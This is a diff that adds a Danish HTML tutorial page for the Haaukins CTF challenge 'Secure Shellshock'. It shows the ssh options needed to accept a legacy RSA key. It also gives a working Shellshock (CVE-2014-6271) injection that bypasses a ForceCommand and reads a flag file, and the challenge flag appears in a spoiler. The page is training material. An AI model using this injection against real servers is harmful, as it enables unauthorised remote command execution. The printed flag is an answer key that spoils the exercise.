@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Secure Shellshock — tutorial (CVE-2014-6271)</title>
+<meta name="description" content="Guide til Haaukins Secure Shellshock: log ind med en legacy RSA-nøgle og bypass en ForceCommand-2FA med Shellshock-injection.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Secure Shellshock</h1>
+<p class="subtitle">Legacy SSH-nøgle + Shellshock-bypass af en fake-2FA ForceCommand.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>SSH-server fra 2011, bruger <code>user</code>, privat nøgle udleveret. To forhindringer: en gammel
+             RSA-nøgle moderne OpenSSH afviser, og en ForceCommand ('fake 2FA') i stedet for en shell.</p>
+<h2>Trin for trin</h2>
+<pre><code># 1) legacy RSA (hint: "serious auth scheme from 2011")
+ssh -i private.key -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa user@&lt;ip&gt;
+# 2) Shellshock bypasser ForceCommand (sshd lægger din kommando i SSH_ORIGINAL_COMMAND):
+ssh -i private.key -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa \
+  user@&lt;ip&gt; "() { :;}; /bin/bash -c 'id; cat /home/user/flag.txt'"</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{Find_your_way_home_and_RIP_Coocoo}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Gamle nøgler/servere kræver <code>-o PubkeyAcceptedAlgorithms=+ssh-rsa</code> på moderne klienter.</li><li>Shellshock: <code>() { :;};&lt;payload&gt;</code> i en env-var/SSH_ORIGINAL_COMMAND giver RCE og omgår ForceCommand.</li><li>Verificér med et benignt <code>id</code> før du læser flaget.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
